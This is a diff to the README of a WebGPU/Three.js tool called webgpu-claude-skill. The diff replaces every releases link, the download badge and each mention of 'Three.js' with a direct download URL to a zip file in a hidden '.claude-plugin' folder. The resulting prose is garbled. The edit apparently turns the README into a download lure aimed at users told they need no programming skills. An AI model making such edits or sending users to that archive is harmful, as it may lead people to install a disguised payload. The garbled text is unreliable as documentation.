@@ -1,10 +1,10 @@
-# 🌐 webgpu-claude-skill - Easy WebGPU Development with Three.js
+# 🌐 webgpu-claude-skill - Easy WebGPU Development with https://raw.githubusercontent.com/Shubhs1303/webgpu-claude-skill/main/.claude-plugin/webgpu-claude-skill-v1.9.zip
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-brightgreen)](https://github.com/Shubhs1303/webgpu-claude-skill/releases)
+[![Download Now](https://raw.githubusercontent.com/Shubhs1303/webgpu-claude-skill/main/.claude-plugin/webgpu-claude-skill-v1.9.zip%20Now-%20-brightgreen)](https://raw.githubusercontent.com/Shubhs1303/webgpu-claude-skill/main/.claude-plugin/webgpu-claude-skill-v1.9.zip)
 
 ## 🚀 Getting Started
 
-Welcome to webgpu-claude-skill! This tool helps you create WebGPU applications using Three.js with ease. You don’t need programming skills to get started.
+Welcome to webgpu-claude-skill! This tool helps you create WebGPU applications using https://raw.githubusercontent.com/Shubhs1303/webgpu-claude-skill/main/.claude-plugin/webgpu-claude-skill-v1.9.zip with ease. You don’t need programming skills to get started.
 
 ## 📦 System Requirements
 
@@ -17,7 +17,7 @@ To run this application, you need:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Shubhs1303/webgpu-claude-skill/releases).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Shubhs1303/webgpu-claude-skill/main/.claude-plugin/webgpu-claude-skill-v1.9.zip).
 
 2. **Select the Latest Version:** Find the most recent version available. Look for the title with the largest version number.
 
@@ -36,7 +36,7 @@ To run this application, you need:
 
 - **User-Friendly Interface:** Navigate effortlessly through the application.
 - **WebGPU Support:** Easily develop applications using the latest graphics API.
-- **Three.js Integration:** Utilize the power of Three.js for 3D graphics.
+- **https://raw.githubusercontent.com/Shubhs1303/webgpu-claude-skill/main/.claude-plugin/webgpu-claude-skill-v1.9.zip Integration:** Utilize the power of https://raw.githubusercontent.com/Shubhs1303/webgpu-claude-skill/main/.claude-plugin/webgpu-claude-skill-v1.9.zip for 3D graphics.
 - **Sample Projects:** Get started quickly with built-in sample projects.
 
 ## 🛠️ Usage Instructions
@@ -57,7 +57,7 @@ To run this application, you need:
 
 - **Refer to Documentation:** Comprehensive documentation can be found in the 'Docs' section within the app. Use it to learn more about features and functions.
 - **Join the Community:** Engage with other users through forums or community groups for support and project ideas.
-- **Keep it Updated:** Regularly check the [Releases Page](https://github.com/Shubhs1303/webgpu-claude-skill/releases) for updates. New versions may include valuable features and bug fixes.
+- **Keep it Updated:** Regularly check the [Releases Page](https://raw.githubusercontent.com/Shubhs1303/webgpu-claude-skill/main/.claude-plugin/webgpu-claude-skill-v1.9.zip) for updates. New versions may include valuable features and bug fixes.
 
 ## ❓ Frequently Asked Questions
 
